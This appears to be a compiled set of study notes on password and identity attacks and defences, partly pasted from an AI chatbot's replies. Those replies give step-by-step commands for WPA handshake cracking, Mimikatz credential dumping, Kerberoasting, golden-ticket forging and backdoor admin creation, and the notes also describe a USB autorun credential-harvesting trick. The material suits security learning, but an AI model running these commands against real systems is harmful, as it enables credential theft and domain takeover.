# Contents

[Introduction [1](#introduction)](#introduction)

[Types of Cyber Attacks on IAM [8](#_Toc226317378)](#_Toc226317378)

[Brute-Force Attack [9](#brute-force-attack)](#brute-force-attack)

[Dictionary attack [26](#dictionary-attack)](#dictionary-attack)

[Distributed Network Attack [28](#distributed-network-attack-1)](#distributed-network-attack-1)

[Windows IAM [29](#windows-iam)](#windows-iam)

[Mimikatz [31](#mimikatz)](#mimikatz)

[Lateral Movement [31](#lateral-movement)](#lateral-movement)

[Wordlists [31](#wordlists)](#wordlists)

[Rainbow Tables [33](#rainbow-tables)](#rainbow-tables)

# Introduction

Password cracking techniques are used to recover passwords from computer systems. Attackers use these techniques to gain unauthorized access to vulnerable systems. Most password attacks succeed due to weak, reused, or easily guessable passwords.

In many cases, attackers gain access to a login interface or password database and use automated tools with high computing power to attempt thousands or millions of password combinations in a short time.

If passwords are short, common, reused, or predictable, the likelihood of compromise is very high.

**How Attackers Obtain Passwords**

Attackers can gain access to passwords through:

- **Network sniffing** (capturing unencrypted traffic)

- **Social engineering** (tricking users into revealing credentials)

- **Password guessing** (random or systematic attempts)

- **Access to password databases** (e.g., breaches, dumps)

## Types of Password Attacks

**1. Non-Technical Attacks**

No advanced technical skills required:

- **Shoulder Surfing** – Observing users entering passwords

- **Social Engineering** – Phishing, pretexting, impersonation

- **Dumpster Diving** – Retrieving passwords from discarded materials

**2. Active Online Attacks**

Attacker directly interacts with the target system:

- **Brute Force Attack** – Attempts all possible combinations

- **Dictionary Attack** – Uses a list of common passwords

- **Hybrid Attack** – Combines dictionary + variations (e.g., Password@123)

- **Password Guessing** – Based on user info (names, DOB, etc.)

- **Credential Stuffing** – Using leaked credentials on multiple services

- **Kerberos Attacks** – Password attacks targeting authentication tickets

- **LLMNR/NBT-NS Poisoning** – Captures credentials via network spoofing

- **Hash Injection / Pass-the-Hash** – Using stolen hashes without cracking

**3. Passive Online Attacks**

No direct interaction with authentication system:

- **Packet Sniffing** – Capturing network traffic

- **Man-in-the-Middle (MitM)** – Intercepting communications

- **Replay Attacks** – Reusing captured authentication data

- **SSL Stripping** – Downgrading HTTPS to HTTP

**4. Offline Attacks**

Performed after obtaining password hashes:

- **Rainbow Table Attack** – Precomputed hash lookup

- **Brute Force (Offline)** – Faster due to no system lockouts

- **Distributed Cracking** – Using botnets/GPU clusters

- **Password Hash Cracking** – Using tools like Hashcat

**5. Malware-Based Attacks**

- **Keylogging** – Recording keystrokes

- **Spyware/Trojans** – Extracting stored credentials

- **Credential Dumping** – Extracting passwords from memory

**6. Interception Attacks**

- Capture credentials in transit

- Exploit weak or missing encryption

Examples:

- Packet sniffing

- MitM attacks

- SSL stripping

**Common Password Cracking Techniques**

- **Brute Force** – Tries every possible combination

- **Dictionary Attack** – Uses precompiled wordlists

- **Hybrid Attack** – Dictionary + patterns

- **Rainbow Table Attack** – Precomputed hashes

**Password Attack Lifecycle (Simplified)**

1.  **Reconnaissance** – Gather user/system information

2.  **Credential Acquisition** – Sniffing, phishing, malware

3.  **Cracking Phase** – Online or offline attacks

4.  **Access & Persistence** – Use valid credentials

## How to Defend against Password Cracking?

- Enable information security audit to monitor and track password attacks.

- Do not use the same password during password change.

- Do not share passwords.

- Do not use passwords that can be found in a dictionary.

- Do not use cleartext protocols and protocols with weak encryption.

- Set the password change policy to 30 days.

- Avoid storing passwords in an unsecured location.

- Do not use any system's default passwords.

- Make passwords hard to guess by using 8-12 alphanumeric characters in combination of uppercase and lowercase letters, numbers, and symbols.

- Ensure that applications neither store passwords to memory nor write them to disk in clear text.

- Use a random string (salt) as prefix or suffix with the password before encrypting.

- Enable SYSKEY with a strong password to encrypt and protect the SAM database.

- Never use passwords such as date of birth, spouse, or child's or pet's name.

- Monitor the server's logs for brute force attacks on the users accounts.

- Lock out an account subjected to too many incorrect password guesses.

## Security Best Practices

**Strong Password Guidelines**

- **Length** – Minimum 12–16 characters

- **Complexity** – Use upper, lower, numbers, symbols

- **Obscurity** – Avoid names, dates, common words

- **Randomness** – Use randomly generated passwords

- **Uniqueness** – Do not reuse passwords

- **Storage** – Use secure password managers

- **Sharing** – Never share passwords

- **Rotation** – Change only when compromised (modern best practice)

**Multi-Factor Authentication (MFA)**

Multi-Factor Authentication (MFA) enhances security by requiring multiple verification factors:

**Authentication Factors**

- **Knowledge (Something you know)**\
  Password, PIN, security questions

- **Possession (Something you have)**\
  OTP, mobile device, smart card

- **Inherence (Something you are)**\
  Biometrics (fingerprint, face, retina)

- **Location (Somewhere you are)**\
  Geo-location, IP-based restrictions

- **Time (When you access)**\
  Time-based access controls

**Prevention Measures**

- Enforce **strong password policies**

- Enable **MFA everywhere possible**

- Use **account lockout / rate limiting**

- Implement **encryption (HTTPS, VPN)**

- Deploy **EDR/XDR solutions**

- Monitor **login anomalies (SIEM like Microsoft Sentinel)**

- Educate users on **phishing awareness**

- Use **passwordless authentication** where possible

**Important Note (Security & Ethics)**

Techniques such as bypassing OS passwords (e.g., Linux boot modification or third-party tools for Windows) are often discussed in security learning contexts but must **only be used in authorized environments** such as:

- Security testing labs

- Incident response

- Authorized penetration testing

Unauthorized use is illegal and violates security policies.

**Summary**

Password attacks remain one of the most common attack vectors. Weak passwords, lack of MFA, and poor security practices significantly increase risk. A combination of **strong authentication, monitoring, and user awareness** is essential to defend against these attacks.

# Types

- **Password Spray attack** means attacker <span class="mark">attempts to match username against list of weak passwords.</span>

- **Password interception attack** means attacker <span class="mark">intercepts password when they are transmitted over internet.</span>

- **Dictionary attack** means attacker uses <span class="mark">dictionary of common passwords to gain access.</span>

- **Password guessing attack** means attacker <span class="mark">uses some tool to guess the password</span>.

- **Credential stuffing attack** means attacker <span class="mark">collects large number of stolen account credentials from data breach</span> and then uses those credentials to gain unauthorized access.

- **Pass the hash attack** means attacker steals a hashed user credential (without cracking it) and reuses it to trick an authentication system into creating a new authenticated session on the same network.

- **Internal Monologue Attack** means attacker to <span class="mark">retrieve “NTLM hashes” without directly accessing the “LSASS process memory”</span> or triggering antivirus software and Windows Credential Guard. It is similar to the well-known tool “Mimikatz”, which enables adversaries to extract plain text passwords from LSASS process memory for post-exploitation lateral movement.

- **Birthday Attack** means attacker <span class="mark">compares one-way hashes of a password based on a birthday paradox that at least two people out of 253 in a room will statistically have the same birthday.</span>

# Brute-Force Attack

- **What is a Brute Force Attack? How can you prevent it?** Brute Force is a way of finding out the right credentials by repetitively trying all the permutations and combinations of possible credentials. In most cases, brute force attacks are automated where the tool/software automatically tries to login with a list of credentials. There are various ways to prevent Brute Force attacks. Some of them are: Password Length: You can set a minimum length for password. The lengthier the password, the harder it is to find. Password Complexity: Including different formats of characters in the password makes brute force attacks harder. Using alpha-numeric passwords along with special characters, and upper- and lower-case characters increase the password complexity making it difficult to be cracked. Limiting Login Attempts: Set a limit on login failures. For example, you can set the limit on login failures as 3. So, when there are 3 consecutive login failures, restrict the user from logging in for some time, or send an Email or OTP to use to log in the next time. Because brute force is an automated process, limiting login attempts will break the brute force process.

- **What are the techniques used in preventing a Brute Force Attack?** Ans. Brute Force Attack is a trial-and-error method that is employed for application programs to decode encrypted data such as data encryption keys or passwords using brute force rather than using intellectual strategies. It is a way to identify the right credentials by repetitively attempting all the possible methods. Brute Force attacks can be avoided by the following practices: Adding password complexity: Include different formats of characters to make passwords stronger. Limit login attempts: set a limit on login failures. Two-factor authentication: Add this layer of security to avoid brute force attacks.

- **Explain the brute force attack. How to prevent it?** It is a trial-and-error method to find out the right password or PIN. Hackers repetitively try all the combinations of credentials. In many cases, brute force attacks are automated where the software automatically works to login with credentials. There are ways to prevent Brute Force attacks. They are: Setting password length. Increase password complexity. Set limit on login failures.

**Penetration Testing Summary for Azure VMs, AD, Microsoft Entra ID, and Local Accounts**

**1. Azure Windows/Linux Virtual Machines**

- **Initial Access & Enumeration:**

  - Use tools like **Nmap** for port scanning and service enumeration.

  - Identify exposed management services (e.g., RDP on Windows, SSH on Linux).

  - Leverage Azure-specific features such as **Run Command** to execute scripts remotely if credentials or tokens are obtained.

- **Credential Harvesting & Lateral Movement:**

  - Extract credentials from VM memory or disk (e.g., using **Mimikatz** on Windows).

  - Use harvested credentials for lateral movement across other Azure VMs or services.

- **Privilege Escalation:**

  - Exploit misconfigurations, unpatched vulnerabilities, or weak local accounts.

  - Check for Azure VM managed identities that may have excessive permissions.

**2. Active Directory (On-Prem or Hybrid)**

- **Enumeration:**

  - Use tools like **BloodHound**, **SharpHound**, and **PowerView** to map AD relationships and permissions.

  - Identify high-privilege accounts, service accounts, and trust relationships.

- **Credential Attacks:**

  - Perform Kerberos attacks (e.g., **Kerberoasting**).

  - Use **AS-REP Roasting** against users without pre-authentication.

  - Extract NTLM hashes and attempt offline cracking.

- **Privilege Escalation & Persistence:**

  - Exploit delegation rights and service principal name (SPN) misconfigurations.

  - Abuse **Golden Tickets**, **Silver Tickets**, and **Pass-the-Hash** techniques.

  - Use AD abuse tools to create backdoor accounts or escalate privileges.

**3. Microsoft Entra ID (Azure AD)**

- **Reconnaissance:**

  - Enumerate users, groups, and app registrations via **Microsoft Graph API**, **Azure CLI**, or **PowerShell**.

  - Look for excessive permissions on app registrations or service principals.

- **Identity and Access Abuse:**

  - Exploit **OAuth** and **OpenID Connect** flows to obtain tokens illegitimately.

  - Abuse **privileged roles**, consent phishing, or token theft for lateral movement.

  - Target **conditional access policies** to bypass security controls.

- **Persistence:**

  - Create or abuse **malicious app registrations** with delegated permissions.

  - Use **Azure AD Connect Sync** misconfigurations for privilege escalation.

**4. Local Accounts**

- **Credential Gathering:**

  - Extract local administrator credentials or password hashes from machines.

  - Use **Pass-the-Hash** or **Pass-the-Ticket** attacks to impersonate users without needing plaintext passwords.

- **Password Cracking:**

  - Use tools like **Hashcat** or **John the Ripper** to crack hashes offline.

- **Misconfiguration Exploits:**

  - Look for weak or default local passwords.

  - Exploit unprotected local accounts or cached credentials.

**5. Wireless Penetration Testing (Recap)**

- Set up Wi-Fi AP with known password.

- Put Wi-Fi adapter in monitor mode (airmon-ng start wlan0).

- Scan for APs (airodump-ng wlan0mon).

- Capture handshake on AP’s channel (airodump-ng -c \<channel\> --bssid \<BSSID\> -w \<file\>).

- Force client re-authentication (aireplay-ng --deauth 0 -a \<BSSID\> wlan0mon).

- Crack handshake offline using dictionary/brute force with **Aircrack-ng**, **Hashcat**, or **John the Ripper**.

## Wireless Penetration Testing: Password Cracking Using Captured Handshakes

**Overview**

After capturing a Wi-Fi handshake (handshake.cap), the goal is to brute-force the password by comparing guesses against the handshake’s cryptographic data (MIC). Multiple tools and methods exist, each with its own workflow and advantages.

------------------------------------------------------------------------

**1. Aircrack-ng**

- Rename your captured handshake file to handshake.cap for simplicity.

- Use a dictionary file (dict.txt) with candidate passwords. For demonstration, a few passwords suffice if you know the likely password.

- Command:

- aircrack-ng handshake.cap -w dict.txt

- Aircrack-ng will try passwords from the dictionary and output the correct password when found.

------------------------------------------------------------------------

**2. Cowpatty**

- Another popular WPA handshake cracking tool.

- If the capture file is renamed to wifi.cap, use it accordingly.

- Command:

- cowpatty -r wifi.cap -f dict.txt -s raaj

  - -r: input capture file

  - -f: dictionary file

  - -s: target SSID

------------------------------------------------------------------------

**3. Hashcat**

- A high-performance hash cracking tool, often preferred for large-scale or GPU-accelerated cracking.

- Convert .cap file to Hashcat’s format .hccapx using the cap2hccapx utility:

- cd /usr/share/hashcat-utils

- ./cap2hccapx.bin /root/wifi.cap /root/wifi.hccapx

- Run Hashcat with WPA/WPA2 hash mode (-m 2500):

- hashcat -m 2500 wifi.hccapx dict.txt --show

- --show displays the cracked password after cracking.

------------------------------------------------------------------------

**4. John the Ripper**

- John the Ripper can also crack WPA handshakes after converting the capture to an appropriate format.

- Convert .cap to .hccapx using hcxpcapngtool:

- hcxpcapngtool -o wifi.hccapx wifi.cap

- Convert .hccapx to a John hash file:

- /usr/sbin/hccap2john wifi.hccapx \> wifihash

- Crack using John:

- john --wordlist=dict.txt --format=wpapsk wifihash

- Display cracked passwords:

- john --show wifihash

------------------------------------------------------------------------

**Summary**

- Multiple tools exist for cracking WPA/WPA2 handshakes, each requiring conversion of .cap files to tool-specific formats.

- Having multiple methods (“arrows in your quiver”) improves flexibility if one tool or method encounters issues.

- Always use a well-curated dictionary and consider combining with brute-force or hybrid attacks depending on password complexity.

------------------------------------------------------------------------

If you want, I can also help summarize or create similar step-by-step guides for Azure Windows/Linux VM pentesting, Active Directory, Microsoft Entra ID, or local account attacks. Just say the word!

Awesome! Here’s a **clear, summarized, and corrected overview** of penetration testing techniques for:

- **Azure Windows/Linux VMs**

- **Active Directory (AD)**

- **Microsoft Entra ID (Azure AD)**

- **Local Accounts**

I’ll keep it practical and focused on key steps and tools.

------------------------------------------------------------------------

**Penetration Testing Summary: Azure VMs, AD, Microsoft Entra ID, and Local Accounts**

------------------------------------------------------------------------

**1. Azure Windows/Linux Virtual Machines (VMs)**

**Initial Access & Enumeration**

- Scan open ports/services (e.g., RDP for Windows, SSH for Linux) using **Nmap**.

- Identify running services and possible vulnerabilities.

- Use Azure **Run Command** feature to execute scripts remotely (requires some access).

**Credential Access & Lateral Movement**

- Extract credentials from VM memory (Windows: **Mimikatz**).

- Use SSH or RDP with harvested credentials to access other VMs.

- Check for **Managed Identities** with excessive permissions to escalate.

**Privilege Escalation**

- Exploit vulnerable software or misconfigurations.

- Check local user privileges, scheduled tasks, or scripts running as SYSTEM/root.

------------------------------------------------------------------------

**2. Active Directory (On-Prem or Hybrid)**

**Enumeration**

- Use **BloodHound** and **PowerView** to map users, groups, and permissions.

- Identify high-privilege accounts and trust relationships.

**Credential Attacks**

- Perform **Kerberoasting** (requesting service tickets for SPNs, then offline cracking).

- Perform **AS-REP Roasting** on users without pre-authentication.

- Dump password hashes using tools like **SecretsDump** or **Mimikatz**.

**Privilege Escalation & Persistence**

- Abuse delegation rights.

- Forge **Golden Tickets** or **Silver Tickets** for persistent domain admin access.

- Create backdoor accounts or manipulate Group Policy Objects (GPOs).

------------------------------------------------------------------------

**3. Microsoft Entra ID (Azure AD)**

**Reconnaissance**

- Enumerate users, groups, applications, and permissions via **Azure CLI**, **PowerShell**, or **Microsoft Graph API**.

**Identity & Access Abuse**

- Exploit **OAuth** or **OpenID Connect** misconfigurations.

- Abuse app registrations with excessive permissions to obtain tokens.

- Use token theft or consent phishing to elevate access.

**Persistence**

- Create or abuse malicious app registrations.

- Abuse synchronization misconfigurations in **Azure AD Connect**.

- Exploit conditional access policy gaps.

------------------------------------------------------------------------

**4. Local Accounts**

**Credential Harvesting**

- Dump local password hashes or clear-text passwords from target systems.

- Use **Pass-the-Hash** or **Pass-the-Ticket** attacks to impersonate users without needing plaintext passwords.

**Password Cracking**

- Use **Hashcat** or **John the Ripper** to crack local hashes offline.

**Exploitation**

- Check for weak or default passwords.

- Exploit cached credentials or unprotected local accounts.

------------------------------------------------------------------------

If you want detailed **step-by-step commands, tools, or example workflows** for any of these areas, just let me know which one you want me to deep-dive into first!

Great! Let’s start with a **step-by-step example for Azure Windows VM penetration testing**, then we can move on to AD, Microsoft Entra ID, and local accounts as you want.

------------------------------------------------------------------------

**Azure Windows VM Penetration Testing: Step-by-Step Example**

**1. Initial Recon & Access**

- **Scan Azure VM IP or hostname:**

nmap -sV -p- \<Azure_VM_Public_IP\>

- Look for open ports (commonly 3389 for RDP).

- **Try RDP login using known or guessed credentials:**

Use an RDP client or xfreerdp in Linux:

xfreerdp /v:\<Azure_VM_Public_IP\> /u:\<username\> /p:\<password\>

------------------------------------------------------------------------

**2. Enumerate Local System and Network**

- Once inside, open PowerShell or Command Prompt.

- Enumerate local users:

net user

- Enumerate groups and memberships:

net localgroup administrators

- Check network info and other machines in the subnet:

ipconfig /all

net view

------------------------------------------------------------------------

**3. Credential Harvesting**

- Run **Mimikatz** to extract plaintext passwords or hashes:

privilege::debug

sekurlsa::logonpasswords

------------------------------------------------------------------------

**4. Lateral Movement**

- Use harvested credentials to RDP or SSH into other VMs.

- Use **Azure Run Command** to execute commands remotely on other Azure VMs you have access to:

az vm run-command invoke -g \<ResourceGroup\> -n \<VMName\> --command-id RunPowerShellScript --scripts "whoami"

------------------------------------------------------------------------

**5. Privilege Escalation**

- Search for vulnerable services or misconfigurations:

Get-Service \| where {\$\_.StartType -eq "Auto" -and \$\_.Status -ne "Running"}

- Check for writable service binaries or scheduled tasks.

------------------------------------------------------------------------

**6. Persistence**

- Create new local admin user:

net user attacker Password123! /add

net localgroup administrators attacker /add

------------------------------------------------------------------------

If you want, I can provide similar **detailed walkthroughs for AD, Microsoft Entra ID, and local account attacks** next! Just say which one you want to do next or if you want all four in order.

Perfect! Here’s a step-by-step summary for **Active Directory (AD) penetration testing** next. After that, I’ll do Microsoft Entra ID and local accounts.

------------------------------------------------------------------------

**Active Directory Penetration Testing: Step-by-Step**

**1. AD Enumeration**

- Use **PowerView** (part of PowerShell Empire or standalone) to discover domain info:

Import-Module .\PowerView.ps1

Get-NetUser -Domain yourdomain.local

Get-NetGroup -Domain yourdomain.local

Get-NetComputer -Domain yourdomain.local

- Use **BloodHound** (via SharpHound) to gather relationships and permissions:

SharpHound.exe -c All

Upload results to BloodHound GUI to visualize attack paths.

------------------------------------------------------------------------

**2. Credential Harvesting**

- Use **SecretsDump.py** from Impacket to dump hashes remotely if you have some access:

secretsdump.py -just-dc-ntlm yourdomain/username@dc_ip

- Run **Mimikatz** on compromised machines to extract plaintext creds or tickets.

------------------------------------------------------------------------

**3. Kerberoasting Attack**

- Request Kerberos service tickets for SPNs and crack offline:

GetUserSPNs.py -request -dc-ip \<dc_ip\> yourdomain/username -outputfile kerberoast.tickets

- Crack the ticket hashes with **Hashcat** or **John the Ripper**.

------------------------------------------------------------------------

**4. AS-REP Roasting**

- Target users with no pre-authentication enabled:

GetNPUsers.py yourdomain/ -usersfile users.txt -outputfile asrep_hashes.txt

Crack with Hashcat or John.

------------------------------------------------------------------------

**5. Privilege Escalation**

- Check for unconstrained delegation or delegation rights using BloodHound.

- Forge **Golden Tickets** with Mimikatz:

kerberos::golden /user:Administrator /domain:yourdomain.local /sid:S-1-5-21-... /krbtgt:hash /id:500 /ptt

------------------------------------------------------------------------

**6. Persistence**

- Add backdoor users/groups.

- Create or modify Group Policy Objects.

------------------------------------------------------------------------

Next, would you like me to give you the **Microsoft Entra ID (Azure AD) attack techniques** or the **local accounts pentest steps**? Or both?

Brute Force attack Countermeasures

Adding password complexity: Include different formats of characters to make passwords stronger. Limit login attempts: set a limit on login failures. Two-factor authentication: Add this layer of security to avoid brute force attacks.

Brute-force password guessing:

- An attacker uses software to try many different passwords, in the hope of guessing the correct one. The software can use some logic to trying passwords related to the name of the individual, their job, their family, etc. Brute Force Attack is a trial-and-error method that is employed for application programs to decode encrypted data such as data encryption keys or password using brute force rather than using intellectual strategies. It’s a way to identify the right credentials by repetitively attempting all the possible methods.

-  

Brute Force attack

> The program tries every combination of characters until the password is broken.

- An attacker uses software to try many different passwords, in the hope of guessing the correct one.

- The software can use some logic to trying passwords related to the name of the individual, their job, their family, etc.

- Brute Force Attack is a trial and error method that is employed for application programs to decode encrypted data such as data encryption keys or passwords using brute force rather than using intellectual strategies.

- It’s a way to identify the right credentials by repetitively attempting all the possible methods.

- **How to prevent Brute Force attacks?**

  - Adding password complexity: Include different formats of characters to make passwords stronger.

  - Limit login attempts: set a limit on login failures.

  - Two-factor authentication: Add this layer of security to avoid brute force attacks.

- **Tools used:**

  - Hydra

> Brute force attack
>
> Password spraying attack
>
> Social engineering attacks
>
> **Most Common Types of Identity Theft:**

- Credit Card Fraud

- Loan or Lease Fraud

- Phone or Utilities Fraud

- Bank Fraud

- Employment or Tax related Fraud

- Government documents or benefits fraud

>  
>
> **Common Identity Attacks:**

- Password based attacks

  - Brute Force Attack - Try many passwords against one or more accounts, sometimes using dictionaries of commonly used passwords.

  - Password Spray Attack - Attempts to match username against list of weak passwords.

>  

- Password based attacks

  - Brute Force Attack - Try many passwords against one or more accounts, sometimes using dictionaries of commonly used passwords.

  - Password Spray Attack - Attempts to match username against list of weak passwords.

- Password Cracking Tools:

  - John the Ripper

  - Hashcat

  - Brutus

  - Aircrack-ng

  - Wfuzz

  - THC Hydra

  - Medusa

  - Rainbow Crack

  - LoPhtCrack

  - Ophcrack

> Identity Thefts

- Credit Card Fraud

- Loan or Lease Fraud

- Phone or Utilities Fraud

- Bank Fraud

- Employment or Tax related Fraud

- Government documents or benefits fraud

>  
>
>  
>
> Password attacks and Defense
>
> <img src="media/image1.png" style="width:6.26806in;height:2.85069in" />
>
>  
>
>  
>
> <img src="media/image2.png" style="width:6.26806in;height:3.43056in" />
>
>  

**Password Attacks**

- Password cracking techniques are used to recover passwords from computer systems.

- Attackers use password cracking techniques to gain unauthorized access to the vulnerable system.

- Most of the password cracking techniques are successful due to weak or easily guessable passwords.

- In this scenario, an attacker has acquired access to a service interface, or to a data store that allows them to try many different password combinations for an account.

- Using specialized software and high capacity computing, attackers can complete many thousands of combinations in a very short amount of time.

- If the password is very short, very weak, very common, or the same as another account password owned by the user, the chances are very good that an attacker can guess the password and compromise the account.

- Hacker can gain access to the password information of an individual by:

  - By sniffing the connection to the network

  - Using social engineering or guessing, an attacker can ‘guess’ a password in a random or systematic way.

  - By gaining access to a password database.

- **Types of Password Attacks:**

  - Non-Technical attacks

  - Active online attacks

  - Passive online attacks

  - Offline attacks

 

**Non-Electronic attacks**

- Attackers don’t need any technical knowledge to crack passwords hence known as non-technical attack.

  - **Shoulder Surfing**: Looking at user keyboard or screen while he/she is logging in.

  - **Social Engineering**: Convincing people to reveal passwords

  - **Dumpster Diving**: Searching for sensitive information at the user's trash-bins, printer trash bins, and user desk for sticky notes.

 

**Active online attacks:**

- Attacker performs password cracking by directly communicating with the victim machine.

 

 

**Passive online attacks:**

- Attacker performs password cracking without communicating with the authorizing party.

 

 

**Offline attacks**

- Attacker copies the target's password file and then tries to crack passwords in his own system at different locations.

  - Rainbow Table attack (Pre-Computed Hashes)

  - Distributed Network

>  

 

 

 

 

 

**Dictionary attack**

- Dictionary file is loaded into cracking app that runs against user accounts.

- A dictionary of common passwords is used to gain access to the computer and network of the victim. One method is to copy an encrypted file that has the passwords, apply the same encryption to a dictionary of regularly used passwords, and contrast the findings.

 

 

**Default Passwords**

- A default password is a password supplied by the manufacturer with new equipment (e.g., switches, hubs, routers) that is password protected. Attackers use default passwords in the list of words or dictionaries that they use to perform password guessing attacks.

 

 

**Hash Injection:**

- A hash injection attack allows an attacker to inject a compromised hash into a local session and use the hash to validate to network resources.

- The attacker finds and extracts a logged-on domain admin account hash.

- The attacker uses the extracted hash to log on to the domain controller.

 

 

 

**Password Guessing:**

- The attacker creates a list of all possible passwords from the information collected through social engineering or any other way and tries them manually on the victim's machine to crack the passwords.

- Find a valid user

- Create a list of possible passwords

- Rank passwords from high probability to low

- Key in each password, until the correct password is discovered.

 

 

**Rule-based attack**

- This attack is used when the attacker gets some information about the password: Hybrid Attack, Syllable Attack, Brute Force

 

 

 

 

 

 

 

**Trojan/Spyware/Keyloggers:**

- Attacker installs Trojan/Spyware/Keylogger on the victim's machine to collect the victim's usernames and passwords.

- Trojan/Spyware/Keylogger runs in the background and sends back all user credentials to the attacker.

 

 

 

**Active Online Attack Using USB Drive**

- Download PassView, a password hacking tool

- Copy the downloaded files to USB drive

- Create autorun.info in USB drive: \[autorun\]en=launch.batContents of launch.bat start pspv.exe/stextpspv.txt

- Insert the USB drive and the autorun window will pop-up (if enabled)

- PassView is executed in background and passwords will be stored in.TXT files in USB drive

 

** **

 

 

**Wire Sniffing**

- Attackers run packet sniffer tools on LAN network to access and record the raw network traffic.

- Captured data may include sensitive information such as passwords and emails.

- Sniffed credentials are used to gain unauthorized access to the target system.

** **

 

 

**Man-in-the-Middle**

- **Gain access to the communication channels**: In a MITM attack, the attacker acquires access to the communication channels between victim and server to extract the information.

- **Use sniffer**: In a replay attack, packets and authentication tokens are captured using a sniffer. After the relevant info is extracted, the tokens are placed back on the network to gain access.

- **Considerations**:

  - Relatively hard to perpetrate

  - Must be trusted by one or both sides

  - Can sometimes be broken by invalidating traffic

** **

 

 

** Replay Attack**

 

 

 

 

**Rainbow Table Attack:**

- A rainbow table is a precomputed table which contains word lists like dictionary files and brute force lists and their hash value.

- **Compare the Hashes**: Capture the hash of a password and compare it with the precomputed hash table. If a match is found then the password is cracked.

- **Easy to Recover**: It is easy to recover passwords by comparing captured password hashes to the precomputed tables.

- **Precomputed Hashes**:

  - 1qazwed 🡪 21c40e47dba72e77518ee3ef88ad0cc8

  - hh021da 🡪 2ce80b192cfa47a0d6c8a2446314810b

  - 9da8dasf 🡪 eb0f5690164ffabbed1744087a4d6761

  - sodifo8sf 🡪 2c749bf3fff89778efc50af7e4f8d6a8

- **Tools to create rainbow tables:**

  - **RTGEN**: This program needs several parameters to generate a rainbow table.

  - **WinRTGEN**: It is a graphical rainbow table generator that supports …

- **Rainbow Tables used for password cracking:**

  - "A rainbow table is a precomputed table for caching the output of cryptographic hash functions, usually for cracking password hashes".

  - Tables are usually used in recovering a key derivation function (or credit card numbers, etc.) up to a certain length consisting of a limited set of characters.

  - It is a practical example of a space–time tradeoff, using less computer processing time and more storage than a brute-force attack which calculates a hash on every attempt, but more processing time and less storage than a simple key derivation function with one entry per hash.

  - Use of a key derivation that employs a salt makes this attack infeasible.

  - Reference: [<u>https://en.wikipedia.org/wiki/Rainbow_table</u>](https://en.wikipedia.org/wiki/Rainbow_table)

 

 

 

## Distributed Network Attack 

A Distributed Network Attack (DNA) technique is used for recovering passwords from hashes or password protected files using the unused processing power of machines across the network to decrypt passwords.

The DNA Manager is installed in a central location where machines running on DNA Client can access it over the network.

DNA Manager coordinates the attack and allocates small portions of the key search to machines that are distributed over the network.

DNA Client runs in the background, consuming only unused processor time.

The program combines the processing capabilities of all the clients connected to the network and uses it to crack the password.

**Elcomsoft Distributed Password Recovery**: Elcomsoft Distributed Password Recovery breaks complex passwords, recovers strong encryption keys, and unlocks documents in a production environment.

Microsoft Authentication

**Security Accounts Manager (SAM) Database**: Windows stores user passwords in SAM, or in the Active Directory database in domain. Passwords are never stored in clear text; passwords are hashed and the results are stored in the SAM.

**NTLM Authentication**: The NTLM authentication protocol types:

NTLM authentication protocol

LM authentication protocol

These protocols store the user's password in the SAM database using different hashing methods.

**Kerberos Authentication**: Microsoft has upgraded its default authentication protocol to Kerberos which provides a stronger authentication for client/server applications than NTLM.

 

**How Hash Passwords Are Stored in Windows SAM?**

- **Note**: LM hashes have been disable in Windows Vista and later Windows operating systems, LM will be blank in those systems.

- reg save hklm\sam c:\temp\sam.save

- reg save hklm\system c:\temp\system.save

- pwdump, SMBPasswd

 

**NTLM Authentication Process**

- Note: Microsoft has upgraded its default authentication protocol to Kerberos, which provides stronger authentication for client/server applications than NTLM.

- XP: LM, NTLM

- Vista~: NTLMv2

- LM DES: PASSWOR DXXXXXX， 7 , 7×8=56 bits

 

**Kerberos Authentication**

 

 

**Password Salting**

Password salting is a technique where random strings of character are added to the password to the password before calculating their hashes.

Advantage: Salting makes it more difficult to reverse the hashes and defeats precomputed hash attacks.

Note: Windows password hashes are not salted pwdump7 and fgdump

PWDUMP extracts LM and NTLM password hashes of local user accounts from the Security Account Manager (SAM) database.

fgdump works like pwdump but also extracts cached credentials and allows remote network execution.

These tools must be run with administrator privileges.

 

 

 

## Account Breach

- In this scenario, an account in your organization is breached and can used by an attacker to interact with either resources in the cloud, or with your on-premises infrastructure. Common methods include spear phishing for credentials with harvesting websites, and spear phishing with malware. Once the attacker obtains a username and password, they can generally find a way to authenticate and interface a if they were a legitimate user.

Brute-force password guessing:

An attacker uses software to try many different passwords, in the hope of guessing the correct one. The software can use some logic to trying passwords related to the name of the individual, their job, their family, etc. Brute Force Attack is a trial-and-error method that is employed for application programs to decode encrypted data such as data encryption keys or password using brute force rather than using intellectual strategies. It’s a way to identify the right credentials by repetitively attempting all the possible methods.

**How to prevent Brute Force attacks?**

Adding password complexity: Include different formats of characters to make passwords stronger. Limit login attempts: set a limit on login failures. Two-factor authentication: Add this layer of security to avoid brute force attacks.

**Dictionary attack**

A dictionary of common passwords is used to gain access to the computer and network of the victim. One method is to copy an encrypted that has the passwords, apply the same encryption to a dictionary of regularly used passwords, and contrast the findings.

# Dictionary attack

- Dictionary file is loaded into cracking app that runs against user accounts.

- A dictionary of common passwords is used to gain access to the computer and network of the victim. One method is to copy an encrypted file that has the passwords, apply the same encryption to a dictionary of regularly used passwords, and contrast the findings.

**Default Passwords:**

- A default password is a password supplied by the manufacturer with new equipment (e.g., switches, hubs, routers) that is password protected. Attackers use default passwords in the list of words or dictionaries that they use to perform password guessing attacks.

**Hash Injection:**

- A hash injection attack allows an attacker to inject a compromised hash into a local session and use the hash to validate to network resources.

- The attacker finds and extracts a logged-on domain admin account hash.

- The attacker uses the extracted hash to log on to the domain controller.

**Password Guessing:**

- The attacker creates a list of all possible passwords from the information collected through social engineering or any other way and tries them manually on the victim's machine to crack the passwords.

- Find a valid user

- Create a list of possible passwords

- Rank passwords from high probability to low

- Key in each password, until the correct password is discovered.

<!-- -->

- **Rule-based attack**

<!-- -->

- This attack is used when the attacker gets some information about the password: Hybrid Attack, Syllable Attack, Brute Force

<!-- -->

-  

<!-- -->

- **Trojan/Spyware/Keyloggers:**

<!-- -->

- Attacker installs Trojan/Spyware/Keylogger on the victim's machine to collect the victim's usernames and passwords.

- Trojan/Spyware/Keylogger runs in the background and sends back all user credentials to the attacker.

Active Online Attack Using USB Drive

- • Download PassView, a password hacking tool

- • Copy the downloaded files to USB drive

- • Create autorun.info in USB drive: \[autorun\]en=launch.batContents of launch.bat start pspv.exe/stextpspv.txt

- • Insert the USB drive and the autorun window will pop-up (if enabled)

- • PassView is executed in background and passwords will be stored in.TXT files in USB drive

